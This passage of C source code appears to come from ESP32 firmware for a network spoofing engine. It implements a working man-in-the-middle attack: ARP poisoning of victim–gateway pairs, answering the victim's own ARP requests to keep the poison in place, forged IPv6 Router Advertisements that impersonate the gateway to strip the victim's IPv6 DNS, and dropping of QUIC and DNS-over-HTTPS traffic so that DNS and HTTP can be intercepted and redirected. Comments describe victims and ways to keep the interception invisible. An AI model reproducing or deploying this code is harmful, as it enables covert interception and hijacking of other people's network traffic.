        _sendArp(s_bcast, p.gatewayMac, gIp, s_bcast, tIp, ARP_OP_REQUEST, 2);
        _sendArp(p.gatewayMac, p.targetMac, tIp, p.gatewayMac, gIp, ARP_OP_REPLY, 3);
        _sendArp(s_bcast, p.targetMac, tIp, s_bcast, gIp, ARP_OP_REQUEST, 2);
        vTaskDelay(pdMS_TO_TICKS(5));
    }
}

/// The gateway's LAN MAC: the address that actually answers ARP for it.
///
/// `netspoof_gateway_info()` prefers the LwIP ARP table and then falls back to
/// the AP's BSSID, and on a real router those are two different addresses (a
/// measured 2026-10-23 network: LAN `20:35:43:fe:45:03`, radio
/// `20:35:43:fe:45:04`). Poisoning the radio address never reaches the router's
/// LAN side, so the gateway->victim direction is not intercepted and replies
/// bypass the bridge. Ask ARP for the LAN address first and only fall back.
static bool _resolveGatewayMac(const IPAddress &gw, uint8_t mac[6]) {
    // Cached per gateway address: netspoof_resolve_mac() flushes the ARP table,
    // so doing it for every one of 200 targets would cost a 1.5 s poll each.
    static uint32_t cachedIp = 0;
    static uint8_t cachedMac[6] = {0};
    if (cachedIp == (uint32_t)gw) {
        memcpy(mac, cachedMac, 6);
        return true;
    }
    uint8_t m[6] = {0};
    IPAddress gwCopy = gw;
    if (!netspoof_resolve_mac(gw, m, 1500) && !netspoof_gateway_info(gwCopy, m)) return false;
    if (_isZeroMac(m)) return false;
    memcpy(mac, m, 6);
    cachedIp = (uint32_t)gw;
    memcpy(cachedMac, m, 6);
    return true;
}

/// The default gateway: the caller's address when given, otherwise DHCP's.
static bool _defaultGw(const IPAddress &requested, IPAddress &gw, String &err) {
    gw = requested;
    if ((uint32_t)gw != 0) return true;
    esp_netif_t *sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    esp_netif_ip_info_t info;
    if (!sta || esp_netif_get_ip_info(sta, &info) != ESP_OK || info.gw.addr == 0) {
        err = "could not determine the default gateway";
        return false;
    }
    gw = IPAddress(info.gw.addr);
    return true;
}

/**
 * @brief Add (or refresh) one pair once both MAC addresses are known.
 *
 * Split out so a host discovered by an ARP scan can be paired from the MAC the
 * scan already saw. Re-resolving the address is what made "All devices" fail:
 * a dozing phone answers the scan's broadcast request but ignores the unicast
 * resolve that follows (measured on a 2026-10-21 phone), so the pair was
 * refused with "target did not answer ARP" while the scan listed it a second
 * earlier.
 */
static bool _pairAdd(
    const IPAddress &target, const uint8_t tMac[6], const IPAddress &gw, const uint8_t gMac[6], String &err
) {
    if (_sameMac(tMac, gMac) || _sameMac(tMac, s_myMac)) {
        err = "target resolves to the gateway/our own MAC";
        return false;
    }

    _ensure_mutex();
    NetSpoofPair *pr = s_pairs();
    _lock();
    // Refresh an existing pair instead of adding a duplicate.
    for (int i = 0; i < s_pairCount; i++) {
        if (pr[i].target == target) {
            pr[i].gateway = gw;
            memcpy(pr[i].targetMac, tMac, 6);
            memcpy(pr[i].gatewayMac, gMac, 6);
            NetSpoofPair copy = pr[i];
            _unlock();
            _poisonPair(copy, 5);
            return true;
        }
    }
    if (s_pairCount >= s_pairsCap) {
        int cap = s_pairsCap;
        _unlock();
        err = "too many active ARP pairs (max " + String(cap) + ")";
        return false;
    }
    NetSpoofPair &p = pr[s_pairCount++];
    p.target = target;
    p.gateway = gw;
    memcpy(p.targetMac, tMac, 6);
    memcpy(p.gatewayMac, gMac, 6);
    p.since = millis();
    NetSpoofPair copy = p;
    int active = s_pairCount;
    _unlock();

    if (s_arpSince == 0) s_arpSince = millis();
    // A larger burst makes the first poison stick, but 200 pairs x 5 rounds is
    // 2000 frames in one go: above a couple of dozen pairs two rounds are
    // enough, because the periodic re-poison pass keeps them fresh anyway.
    _poisonPair(copy, active > 32 ? 2 : 5);
    Serial.printf(
        "[NETSPOOF] arp pair: %s (%s) <-> %s (%s)\n",
        target.toString().c_str(),
        _macStr(tMac).c_str(),
        gw.toString().c_str(),
        _macStr(gMac).c_str()
    );
    return true;
}

bool netspoof_arp_start(const IPAddress &target, const IPAddress &gateway, String &err) {
    if (!netspoof_wifi_ready(err)) return false;
    esp_wifi_get_mac(WIFI_IF_STA, s_myMac);

    IPAddress gw;
    if (!_defaultGw(gateway, gw, err)) return false;
    if ((uint32_t)target == 0) {
        err = "targetIP is required";
        return false;
    }
    if (target == gw) {
        err = "targetIP must not be the gateway";
        return false;
    }

    uint8_t tMac[6] = {0}, gMac[6] = {0};
    if (!netspoof_resolve_mac(target, tMac, 2000)) {
        // A host can answer the scan's broadcast request but not the unicast
        // resolve that follows (dozing radios, and routers that relay a
        // broadcoast to every client while dropping some unicast). The scan
        // already holds the MAC, so rescan and pair from it instead of refusing
        // - "target did not answer ARP" used to end the run while `arp` listed
        // the very same address a second later.
        String scanErr;
        netspoof_scan_targets(6000, scanErr);
        bool found = false;
        for (int i = 0; i < netspoof_target_count(); i++) {
            const NetSpoofTarget *t = netspoof_target(i);
            if (!t || t->gateway || !(t->ip == target)) continue;
            memcpy(tMac, t->mac, 6);
            found = true;
            break;
        }
        if (!found) {
            err = "target did not answer ARP (wrong subnet or host down)";
            return false;
        }
        Serial.printf("[NETSPOOF] target %s from the scan, not the unicast resolve\n", target.toString().c_str());
    }
    if (!_resolveGatewayMac(gw, gMac)) {
        err = "could not resolve the gateway MAC (gateway not in the ARP table)";
        return false;
    }
    return _pairAdd(target, tMac, gw, gMac, err);
}

bool netspoof_arp_start_mac(
    const IPAddress &target, const uint8_t targetMac[6], const IPAddress &gateway, String &err
) {
    if (!netspoof_wifi_ready(err)) return false;
    esp_wifi_get_mac(WIFI_IF_STA, s_myMac);

    if ((uint32_t)target == 0) {
        err = "targetIP is required";
        return false;
    }
    if (targetMac == nullptr) {
        err = "targetMAC is required";
        return false;
    }
    uint8_t tMac[6];
    memcpy(tMac, targetMac, 6);
    bool allZero = true;
    for (int i = 0; i < 6; i++) if (tMac[i] != 0) allZero = false;
    if (allZero) {
        err = "targetMAC is empty";
        return false;
    }

    IPAddress gw;
    if (!_defaultGw(gateway, gw, err)) return false;
    if (target == gw) {
        err = "targetIP must not be the gateway";
        return false;
    }

    uint8_t gMac[6] = {0};
    if (!_resolveGatewayMac(gw, gMac)) {
        err = "could not resolve the gateway MAC (gateway not in the ARP table)";
        return false;
    }
    return _pairAdd(target, tMac, gw, gMac, err);
}

void netspoof_arp_restore_all() {
    int n = _pairCountNow();
    for (int i = 0; i < n; i++) {
        NetSpoofPair p;
        if (_pairCopy(i, &p)) _restorePair(p);
    }

    _lock();
    s_pairCount = 0;
    s_arpSince = 0;
    _unlock();
}

bool netspoof_arp_stop(String &err) {
    int n = _pairCountNow();
    if (n == 0) {
        err = "no ARP spoofing is running";
        return false;
    }
    for (int i = 0; i < n; i++) {
        NetSpoofPair p;
        if (_pairCopy(i, &p)) _restorePair(p);
    }

    _lock();
    s_pairCount = 0;
    s_arpSince = 0;
    _unlock();
    Serial.printf("[NETSPOOF] restored %d ARP pair(s)\n", n);
    return true;
}

bool netspoof_arp_active() {
    _lock();
    bool a = s_pairCount > 0;
    _unlock();
    return a;
}

int netspoof_arp_pair_count() {
    _lock();
    int n = s_pairCount;
    _unlock();
    return n;
}

uint32_t netspoof_arp_frames() { return s_arpFrames; }

uint32_t netspoof_arp_uptime_ms() {
    _lock();
    uint32_t since = s_arpSince;
    _unlock();
    return since == 0 ? 0 : millis() - since;
}

bool netspoof_arp_pair_info(
    int idx, IPAddress &target, IPAddress &gateway, char *targetMac, char *gatewayMac
) {
    _lock();
    if (idx < 0 || idx >= s_pairCount) {
        _unlock();
        return false;
    }
    target = s_pairs()[idx].target;
    gateway = s_pairs()[idx].gateway;
    String tm = _macStr(s_pairs()[idx].targetMac);
    String gm = _macStr(s_pairs()[idx].gatewayMac);
    _unlock();
    if (targetMac) strncpy(targetMac, tm.c_str(), 17);
    if (gatewayMac) strncpy(gatewayMac, gm.c_str(), 17);
    return true;
}

bool netspoof_arp_pair_index(const IPAddress &ip, int *idx) {
    _lock();
    for (int i = 0; i < s_pairCount; i++) {
        if (s_pairs()[i].target == ip) {
            if (idx) *idx = i;
            _unlock();
            return true;
        }
    }
    _unlock();
    return false;
}

// ===========================================================================
// 5. The layer-2 hook
// ===========================================================================

/// Claim a free slot. Called from the receive path: no allocation, no blocking.
static NetSpoofSlot *_slotClaim() {
    NetSpoofSlot *found = NULL;
    portENTER_CRITICAL(&s_slotMux);
    for (int i = 0; i < NETSPOOF_QUEUE_DEPTH; i++) {
        if (s_slots[i].state == 0) {
            s_slots[i].state = 1;
            found = &s_slots[i];
            break;
        }
    }
    portEXIT_CRITICAL(&s_slotMux);
    return found;
}

static void _slotPublish(NetSpoofSlot *s) {
    portENTER_CRITICAL(&s_slotMux);
    s->state = 2;
    portEXIT_CRITICAL(&s_slotMux);
}

/// Claim the next ready slot (oldest first, which is just index order).
static NetSpoofSlot *_slotTake() {
    NetSpoofSlot *found = NULL;
    portENTER_CRITICAL(&s_slotMux);
    for (int i = 0; i < NETSPOOF_QUEUE_DEPTH; i++) {
        if (s_slots[i].state == 2) {
            s_slots[i].state = 1;
            found = &s_slots[i];
            break;
        }
    }
    portEXIT_CRITICAL(&s_slotMux);
    return found;
}

static void _slotRelease(NetSpoofSlot *s) {
    portENTER_CRITICAL(&s_slotMux);
    s->state = 0;
    portEXIT_CRITICAL(&s_slotMux);
}

/// Parse the question name of a DNS message into dotted lower-case form.
static bool _dnsQuestion(
    const uint8_t *dns, size_t len, uint16_t *txid, char *name, size_t nameCap, uint16_t *qtype,
    uint16_t *qclass
) {
    if (len < 12) return false;
    uint16_t flags = ((uint16_t)dns[2] << 8) | dns[3];
    if (flags & 0x8000) return false; // a response, not a query
    uint16_t qdcount = ((uint16_t)dns[4] << 8) | dns[5];
    if (qdcount == 0) return false;
    *txid = ((uint16_t)dns[0] << 8) | dns[1];

    size_t pos = 12, out = 0;
    name[0] = '\0';
    while (pos < len) {
        uint8_t label = dns[pos++];
        if (label == 0) break;
        if ((label & 0xC0) == 0xC0) return false; // compression is not valid in a question
        if (pos + label > len) return false;
        if (out + label + 2 >= nameCap) return false;
        if (out) name[out++] = '.';
        for (uint8_t i = 0; i < label; i++) {
            char c = (char)dns[pos + i];
            if (c >= 'A' && c <= 'Z') c = (char)(c - 'A' + 'a');
            name[out++] = c;
        }
        pos += label;
    }
    name[out] = '\0';
    if (pos + 4 > len) return false;
    *qtype = ((uint16_t)dns[pos] << 8) | dns[pos + 1];
    *qclass = ((uint16_t)dns[pos + 2] << 8) | dns[pos + 3];
    return out > 0;
}

/**
 * @brief True when a TCP payload starts with an HTTP request line.
 *
 * Covers every method a web server normally sees, so the interceptor no longer
 * depends on the destination port and catches admin panels, dev servers and
 * alternate HTTP ports (8000, 8888, 3000, ...).
 */
// Wire trace for debugging the forged TCP path. Off in normal builds: it prints
// one line per intercepted segment and would swamp the console at 115200 baud.
#define NETSPOOF_TRACE 0

/// Ports where a plaintext HTTP request is the expected first payload.
///
/// While forwarding is on, a handshake on one of these is answered by this
/// board instead of being bridged: that is what makes "open any website and get
/// the page" work without depending on the device's DNS (a phone with IPv6 DNS,
/// a cached answer or a hard-coded resolver would otherwise go straight to the
/// real server). Every other port is bridged untouched, so nothing that is not
/// plaintext HTTP can be broken by the interception.
static bool _plainHttpPort(uint16_t port) {
    return port == 80 || port == 8080 || port == 8000 || port == 8888 || port == 3000 || port == 5000 ||
           port == 9000;
}

static bool _looksHttp(const char *txt, uint16_t len) {
    if (len < 4) return false;
    return memcmp(txt, "GET ", 4) == 0 || memcmp(txt, "POST", 4) == 0 ||
           memcmp(txt, "HEAD", 4) == 0 || memcmp(txt, "PUT ", 4) == 0 ||
           memcmp(txt, "DELE", 4) == 0 || memcmp(txt, "OPTI", 4) == 0 ||
           memcmp(txt, "PATC", 4) == 0 || memcmp(txt, "TRAC", 4) == 0 ||
           memcmp(txt, "CONN", 4) == 0;
}

// --- bridge helpers -------------------------------------------------------

/// Remember IP -> MAC for a host whose traffic passes through this board.
/// Called from the layer-2 hook (both cores), so the table is guarded by a
/// critical section rather than the engine mutex (which must never be taken
/// from the receive path).
static void _fwdLearn(uint32_t ip, const uint8_t *mac) {
    if (ip == 0 || _isZeroMac(mac)) return;
    NetSpoofPeer *peers = s_fwdPeerMem; // never allocate from the receive path
    if (!peers) return;
    portENTER_CRITICAL(&s_fwdMux);
    NetSpoofPeer &p = peers[ip & (NETSPOOF_FWD_PEERS - 1)];
    p.ip = ip;
    memcpy(p.mac, mac, 6);
    portEXIT_CRITICAL(&s_fwdMux);
}

static bool _fwdPeerMac(uint32_t ip, uint8_t *mac) {
    NetSpoofPeer *peers = s_fwdPeerMem;
    if (!peers) return false;
    bool found = false;
    portENTER_CRITICAL(&s_fwdMux);
    NetSpoofPeer &p = peers[ip & (NETSPOOF_FWD_PEERS - 1)];
    if (p.ip == ip) {
        memcpy(mac, p.mac, 6);
        found = true;
    }
    portEXIT_CRITICAL(&s_fwdMux);
    return found;
}

/// Put one received frame back on the air with rewritten MACs.
///
/// The IP packet is left untouched (no NAT, no TTL change): this is a layer-2
/// bridge, so the gateway sees exactly the frame the victim sent and the reply
/// the victim expects. Called from the receive path, no allocation.
static bool _fwdForward(uint8_t *frame, uint16_t len, const uint8_t *dst, const uint8_t *src) {
    if (len < 14) return false;
    memcpy(frame, dst, 6);
    memcpy(frame + 6, src, 6);
    bool ok = _tx(frame, len);
    if (ok) {
        s_fwdFrames++;
        s_fwdBytes += len;
    } else {
        s_fwdDropped++;
    }
    return ok;
}

/**
 * @brief Bridge one frame between a poisoned client and the real gateway.
 *
 * Only frames addressed to this board's MAC are considered - the ARP poison is
 * what makes them arrive here - and only real unicast destinations: broadcast
 * and multicast traffic already reached everyone and must never be re-sent (a
 * forwarded broadcast is a storm), and anything addressed to the board's own IP
 * belongs to the local stack, not the bridge.
 *
 * Direction is decided by the learned table: a frame for an IP we have seen as
 * a client goes back to that client (gateway -> victim), everything else goes
 * to the gateway (victim -> internet).
 *
 * @return true when the frame was re-sent and must not reach lwIP
 */
static bool _bridgeFrame(uint8_t *frame, uint16_t len, uint32_t srcIp, uint32_t dstIp) {
    if (!s_forwardActive) return false;
    uint32_t myIp = (uint32_t)WiFi.localIP();
    if (myIp == 0) return false;
    if (!_sameMac(frame, s_myMac)) return false; // not addressed to us
    if (dstIp == myIp) return false;             // local stack / interception
    uint8_t dst0 = frame[14 + 16];               // IPv4 destination, first octet
    if (dst0 == 0xFF || (dst0 & 0xF0) == 0xE0) return false; // broadcast/multicast

    uint8_t vmac[6];
    if (_fwdPeerMac(dstIp, vmac)) return _fwdForward(frame, len, vmac, s_myMac);

    _fwdLearn(srcIp, frame + 6);
    if (!s_gwMacOk) return false;
    return _fwdForward(frame, len, s_gwMac, s_myMac);
}

/**
 * @brief Inspect one received frame and queue anything worth answering.
 *
 * Runs on the WiFi receive path, so it only reads the headers, copies a bounded
 * amount of payload into a slot and returns. Anything not understood is passed
 * straight on to the previously installed input handler, which keeps normal
 * station traffic (DHCP, our own TCP) working.
 */
/// EUI-64 link-local address for a MAC (fe80::<mac with ff:fe inserted>).
static void _linkLocalFromMac(const uint8_t *mac, uint8_t out[16]) {
    memset(out, 0, 16);
    out[0] = 0xFE;
    out[1] = 0x80;
    out[8] = (uint8_t)(mac[0] ^ 0x02);
    out[9] = mac[1];
    out[10] = mac[2];
    out[11] = 0xFF;
    out[12] = 0xFE;
    out[13] = mac[3];
    out[14] = mac[4];
    out[15] = mac[5];
}

/// One Router Advertisement: 16-byte RA header + one 24-byte RDNSS option.
#define NETSPOOF_RA_LEN 40
/// Whole ethernet frame carrying it (14 eth + 40 IPv6 + NETSPOOF_RA_LEN).
#define NETSPOOF_RA_FRAME (14 + 40 + NETSPOOF_RA_LEN)

/**
 * @brief Build a Router Advertisement that retires the gateway's IPv6 service.
 *
 * A modern phone prefers IPv6 whenever the network offers it, and on a
 * dual-stack AP that is the whole attack gone: Android sends its DNS to the
 * router's link-local address (advertised with RDNSS, RFC 8106), those packets
 * never touch the IPv4 ARP poison, and every name resolves for real - so
 * `https://github.com` simply loads and no redirect rule ever fires. Measured
 * on the 2026-10-23 test network: the gateway advertises
 * `fe80::2235:43ff:fefe:4503` and a global /64, and a phone on it resolved over
 * IPv6 while the engine saw `dns=0/0`.
 *
 * The fix is the standard "go away" advertisement a captive portal sends, and
 * it has to carry **both** halves:
 *   - router lifetime 0 (bytes 6..7) removes the gateway from the client's
 *     default router list, so new flows have no IPv6 path and fall back to IPv4;
 *   - an RDNSS option (type 25) with **lifetime 0** naming that same link-local
 *     address removes the DNS server itself (RFC 8106 section 5.1), which is
 *     what actually makes the client resolve over IPv4 again. Without it the
 *     phone keeps the IPv6 resolver for the full advertised lifetime (minutes)
 *     and the interception stays invisible.
 *
 * The RA is unicast (only the poisoned client sees it) with the gateway's own
 * link-local as the source, so the client accepts it as coming from its router.
 * It is repeated while the attack runs because the real router re-advertises
 * every few minutes. A network whose client gets its IPv6 resolver from
 * stateful DHCPv6 instead of RDNSS cannot be retired this way.
 *
 * @return frame length, or 0 when @p cap is too small
 */
static uint16_t _buildRaRetire(uint8_t *frame, size_t cap, const uint8_t *dstMac, const uint8_t *gwMac) {
    if (!frame || !dstMac || !gwMac) return 0;
    if (cap < NETSPOOF_RA_FRAME) return 0;
    size_t total = NETSPOOF_RA_FRAME;
    memset(frame, 0, total);
    memcpy(frame, dstMac, 6);
    memcpy(frame + 6, s_myMac, 6);
    frame[12] = 0x86;
    frame[13] = 0xDD;

    uint8_t src[16], dst[16];
    _linkLocalFromMac(gwMac, src);
    _linkLocalFromMac(dstMac, dst);

    uint8_t *ip6 = frame + 14;
    ip6[0] = 0x60;
    ip6[5] = (uint8_t)(NETSPOOF_RA_LEN & 0xFF); // ICMPv6 payload length
    ip6[6] = 58;                                // next header: ICMPv6
    ip6[7] = 255;                               // hop limit for ND
    memcpy(ip6 + 8, src, 16);
    memcpy(ip6 + 24, dst, 16);

    uint8_t *ra = ip6 + 40;
    ra[0] = 134;  // Router Advertisement
    ra[4] = 64;   // current hop limit
    // ra[5] = 0   (flags: not managed, no other-config - nothing to renew)
    // ra[6..7] = 0 -> router lifetime 0: "not a default router anymore"

    // RDNSS option (RFC 8106): type 25, length 3 (24 bytes), lifetime 0, and
    // the server address the client must forget.
    uint8_t *rdnss = ra + 16;
    rdnss[0] = 25;
    rdnss[1] = 3;
    // rdnss[2..3] reserved, rdnss[4..7] lifetime 0
    memcpy(rdnss + 8, src, 16);

    // ICMPv6 checksum over the IPv6 pseudo-header + the whole ICMPv6 message.
    uint32_t acc = 0;
    acc = _sum16(src, 16, acc);
    acc = _sum16(dst, 16, acc);
    acc += NETSPOOF_RA_LEN; // upper-layer packet length
    acc += 58;              // next header
    acc = _sum16(ra, NETSPOOF_RA_LEN, acc);
    _put16(ra + 2, _finish16(acc));

    return (uint16_t)total;
}

/// Send the retire-RA above to one poisoned client.
static bool _sendRaRetire(const uint8_t *dstMac, const uint8_t *gwMac) {
    uint8_t frame[NETSPOOF_RA_FRAME];
    uint16_t len = _buildRaRetire(frame, sizeof(frame), dstMac, gwMac);
    if (!len) return false;
    return _tx(frame, len);
}

/**
 * @brief Tell a client that a dropped QUIC/DoQ datagram has no listener.
 *
 * A silent drop leaves the HTTP/3 client waiting for its own blackhole timer
 * (Chrome's is seconds, and a media app can sit on it), so the TCP fallback is
 * slow or never happens. An ICMPv4 destination-unreachable / port-unreachable
 * is what a captive portal sends and makes the client retry over TCP at once.
 *
 * The quote is the original IP header plus the first 8 bytes (the UDP header),
 * which is all RFC 792 asks for and all the client needs to match the flow. The
 * source is this board: while the ARP pair is up the victim accepts frames from
 * this MAC, and the message is a report about its own datagram, not a claim
 * about the remote host.
 *
 * @param victimMac  the client the datagram came from
 * @param victimIp   its IPv4 address (host order)
 * @param ip         the original IPv4 header
 * @param ihl        its header length in bytes
 * @param totalIpLen the original IPv4 total length
 */
static bool _sendIcmpPortUnreachable(
    const uint8_t *victimMac, uint32_t victimIp, const uint8_t *ip, uint16_t ihl, uint16_t totalIpLen
) {
    uint32_t myIp = (uint32_t)WiFi.localIP();
    if (myIp == 0 || victimMac == NULL || ip == NULL || ihl < 20) return false;
    uint16_t quote = (uint16_t)(ihl + 8); // IP header + first 8 bytes of the datagram
    if (quote > totalIpLen) quote = totalIpLen;
    uint16_t len = (uint16_t)(14 + 20 + 8 + quote);
    if (len < 60) len = 60; // ethernet pads short frames
    if (len > NETSPOOF_FRAME_MAX) return false;

    uint8_t frame[NETSPOOF_FRAME_MAX];
    memset(frame, 0, len);
    memcpy(frame, victimMac, 6);
    memcpy(frame + 6, s_myMac, 6);
    _put16(frame + 12, 0x0800);

    uint8_t *oip = frame + 14;
    oip[0] = 0x45;                                  // version 4, 20-byte header
    oip[8] = 64;                                    // TTL
    oip[9] = 1;                                     // ICMP
    _put16(oip + 2, (uint16_t)(20 + 8 + quote));    // total length
    memcpy(oip + 12, &myIp, 4);                     // source: this board
    memcpy(oip + 16, &victimIp, 4);                 // destination: the client
    _put16(oip + 10, _finish16(_sum16(oip, 20, 0)));

    uint8_t *icmp = oip + 20;
    icmp[0] = 3; // destination unreachable
    icmp[1] = 3; // port unreachable
    memcpy(icmp + 8, ip, quote);
    _put16(icmp + 2, _finish16(_sum16(icmp, (size_t)(8 + quote), 0)));

    return _tx(frame, len);
}

/// True when a TLS ClientHello names a DNS-over-HTTPS endpoint.
///
/// While traffic is bridged a DoH connection would simply succeed, and the
/// browser would resolve everything itself without ever asking this engine.
/// These flows are reset on purpose so the browser falls back to the system
/// resolver - the same thing a captive portal does. The SNI is cleartext in the
/// ClientHello, so a bounded case-insensitive scan is enough.
static bool _tlsLooksLikeDoh(const uint8_t *data, uint16_t len) {
    static const char *kMarkers[] = {
        "cloudflare-dns.com", "dns.google", "nextdns.io", "doh.opendns.com",
        "dns.quad9.net",     "dns.adguard",  "dns.mullvad.net", "dns.alidns.com",
        "doh.pub",           "dns.pub",      "doh.360.cn",      "dns.google.com",
        // DoH-first browsers (DuckDuckGo, Brave, ControlD, CleanBrowsing) keep
        // their own resolver unless its endpoint is refused. Resetting these
        // makes the browser fall back to the system resolver this engine answers.
        "dns.duckduckgo.com", "doh.duckduckgo.com", "dns.brave.com", "doh.controld.com",
        "doh.cleanbrowsing.org", "dns.sb", "doh.libredns.gr", "doh.opendns.com",
        "dns.nextdns.io",     "doh.mullvad.net",   "dns.adguard-dns.com",
    };
    if (!data || len < 8) return false;
    for (size_t m = 0; m < sizeof(kMarkers) / sizeof(kMarkers[0]); m++) {
        const char *needle = kMarkers[m];
        size_t nlen = strlen(needle);
        if (nlen > len) continue;
        for (size_t i = 0; i + nlen <= len; i++) {
            size_t k = 0;
            while (k < nlen) {
                char c = (char)data[i + k];
                if (c >= 'A' && c <= 'Z') c = (char)(c - 'A' + 'a');
                if (c != needle[k]) break;
                k++;
            }
            if (k == nlen) return true;
        }
    }
    return false;
}

// Defined with the other interceptors below (it reuses their header parsers).
static void _observeFrame(
    const uint8_t *frame, uint16_t total, uint8_t ihl, uint8_t proto, uint32_t srcIp, uint32_t dstIp
);

static err_t _nsInputHook(struct pbuf *p, struct netif *inp) {
    netif_input_fn next = s_prevInput;
    if (!p || p->tot_len < 34) return next ? next(p, inp) : ERR_OK;

    // Copy the frame into a scratch buffer: pbufs can be chained and the header
    // walk below needs contiguous bytes. One buffer per core keeps two receive
    // paths from overwriting each other.
    static uint8_t scratchBuf[2][NETSPOOF_FRAME_MAX];
    uint8_t *scratch = scratchBuf[xPortGetCoreID() & 1];
    uint16_t total = p->tot_len;
    if (total > NETSPOOF_FRAME_MAX) total = NETSPOOF_FRAME_MAX;
    if (pbuf_copy_partial(p, scratch, total, 0) != total) return next ? next(p, inp) : ERR_OK;

    // Never intercept our own traffic (the station's own DNS/HTTP would
    // otherwise be answered by this engine).
    if (_sameMac(scratch + 6, s_myMac)) return next ? next(p, inp) : ERR_OK;
    if (_isZeroMac(scratch + 6)) return next ? next(p, inp) : ERR_OK;

    uint16_t etherType = ((uint16_t)scratch[12] << 8) | scratch[13];

    // ARP while a pair is poisoned: answer the target's own ARP refresh with
    // this board's MAC.
    //
    // The periodic poison keeps a *cached* entry pointed at us, but the moment
    // a client decides to re-ARPs (a reconnect, a doze wake-up, an entry going
    // STALE) its request goes out and the REAL gateway answers it first - after
    // which the client bypasses the board completely. That is not theoretical:
    // one run captured 2078 poison frames and not one frame of the target's
    // traffic (dns 0/0, http 0/0), while the run right before it saw 13 DNS and
    // 7 HTTP requests. Answering the request is what makes the takeover
    // deterministic instead of a race with the router.
    if (etherType == 0x0806 && total >= 42) {
        const uint8_t *arp = scratch + 14;
        uint16_t opcode = ((uint16_t)arp[6] << 8) | arp[7];
        if (opcode == ARP_OP_REQUEST && arp[4] == 6 && arp[5] == 4) {
            const uint8_t *senderMac = arp + 8;
            const uint8_t *senderIp = arp + 14;
            const uint8_t *askedIp = arp + 24;
            int n = _pairCountNow();
            for (int i = 0; i < n; i++) {
                NetSpoofPair pr;
                if (!_pairCopy(i, &pr)) continue;
                uint32_t sIp, aIp;
                memcpy(&sIp, senderIp, 4);
                memcpy(&aIp, askedIp, 4);
                uint8_t replyIp[4];
                bool hit = false;
                if (sIp == (uint32_t)pr.target && aIp == (uint32_t)pr.gateway) {
                    uint32_t g = (uint32_t)pr.gateway;
                    memcpy(replyIp, &g, 4);
                    hit = true;
                } else if (sIp == (uint32_t)pr.gateway && aIp == (uint32_t)pr.target) {
                    uint32_t t = (uint32_t)pr.target;
                    memcpy(replyIp, &t, 4);
                    hit = true;
                }
                if (!hit) continue;
                // Tell the asker that the address it wants is this board.
                _sendArp(senderMac, s_myMac, replyIp, senderMac, senderIp, ARP_OP_REPLY, 1);
                pbuf_free(p);
                return ERR_OK;
            }
        }
    }

    // IPv6 cannot be intercepted at all: DNS answers and the TLS endpoint live on
    // IPv4. The RA in _buildRaRetire() asks the client to retire its IPv6 router
    // and resolver, but that is advisory - a cached route, a stale advertisement
    // or a DHCPv6 resolver keeps the client on IPv6, and every one of those flows
    // bypasses this hook. While a guard is armed, drop the victim's IPv6 outright
    // so the fallback is unconditional instead of a hope. Our own frames were
    // already excluded above by source MAC, and the RA is TX, so it is unaffected.
    if (etherType == 0x86DD) {
        if (_mitmFallbackGuard()) {
            s_ipv6Dropped++;
            pbuf_free(p);
            return ERR_OK;
        }
        return next ? next(p, inp) : ERR_OK;
    }
    if (etherType != 0x0800) return next ? next(p, inp) : ERR_OK; // IPv4 only

    const uint8_t *ip = scratch + 14;
    if ((ip[0] >> 4) != 4) return next ? next(p, inp) : ERR_OK;
    uint8_t ihl = (uint8_t)((ip[0] & 0x0F) * 4);
    if (ihl < 20 || 14u + ihl + 8u > total) return next ? next(p, inp) : ERR_OK;

    uint32_t srcIp, dstIp;
    memcpy(&srcIp, ip + 12, 4);
    memcpy(&dstIp, ip + 16, 4);

    uint8_t proto = ip[9];
    if (proto != 17 && proto != 6) {
        // ICMP and friends: bridge them while forwarding, so a poisoned victim
        // can still ping and run a path-MTU probe (both are used by the OS
        // connectivity checks). Without this the ping simply timed out.
        if (s_forwardActive && _bridgeFrame(scratch, total, srcIp, dstIp)) {
            pbuf_free(p);
            return ERR_OK;
        }
        return next ? next(p, inp) : ERR_OK;
    }

    // Recon: a payload that only wants to see the traffic. Nothing is answered,
    // nothing is swallowed - the frame is recorded and then bridged (the poison
    // put the gateway's path through this board), so the client's requests and
    // its internet both stay exactly as they were.
    if (s_observe) {
        _observeFrame(scratch, total, ihl, proto, srcIp, dstIp);
        if (s_forwardActive && _bridgeFrame(scratch, total, srcIp, dstIp)) {
            pbuf_free(p);
            return ERR_OK;
        }
        return next ? next(p, inp) : ERR_OK;
    }

    const uint8_t *l4 = ip + ihl;
    uint16_t srcPort = ((uint16_t)l4[0] << 8) | l4[1];
    uint16_t dstPort = ((uint16_t)l4[2] << 8) | l4[3];
    const uint8_t *payload = NULL;
    uint16_t payloadLen = 0;   // on-wire payload length (ack math)
    uint16_t capturedLen = 0;  // bytes actually present in this frame (parsing)
    uint32_t seq = 0, ack = 0;
    uint8_t flags = 0;
    uint8_t kind = 0;

    if (proto == 17) {
        // QUIC (UDP/443) and DNS-over-QUIC (UDP/853) are encrypted and never
        // reach the HTTP/TLS interceptor. While the engine is running the
        // victim has no real internet path anyway, so dropping them makes the
        // client fall back to TCP (TLS to the board) instead of silently
        // bypassing the redirect. The board's own traffic is already excluded
        // above by the source MAC.
        if ((dstPort == 443 || dstPort == 853) && _mitmFallbackGuard()) {
            // Say "no listener" instead of blackholing the datagram: that is
            // what makes the client retry over TCP immediately rather than wait
            // for its QUIC blackhole timer (and some media apps never retry at
            // all after a silent drop).
            uint16_t ipTotal = ((uint16_t)ip[2] << 8) | ip[3];
            _sendIcmpPortUnreachable(scratch + 6, srcIp, ip, ihl, ipTotal);
            s_quicDropped++;
            pbuf_free(p);
            return ERR_OK;
        }
        // Not DNS, or DNS nobody in this engine answers: bridge it when
        // forwarding is on (NTP, DHCP renewals, game traffic, ...).
        if ((dstPort != 53 || !s_dnsActive) && _bridgeFrame(scratch, total, srcIp, dstIp)) {
            pbuf_free(p);
            return ERR_OK;
        }
        if (dstPort != 53) return next ? next(p, inp) : ERR_OK;
        uint16_t udpLen = ((uint16_t)l4[4] << 8) | l4[5];
        if (udpLen < 8 || (uint16_t)(ihl + udpLen) > (uint16_t)(total - 14)) {
            return next ? next(p, inp) : ERR_OK;
        }
        payload = l4 + 8;
        payloadLen = (uint16_t)(udpLen - 8);
        capturedLen = payloadLen;
        kind = 0;
    } else {
        // HTTPS is terminated by the local secure server, not by forged frames.
        // A connection addressed to this board on the TLS port must reach lwIP
        // so httpd_ssl can accept it; if the hook swallowed the SYN the
        // handshake would never happen.
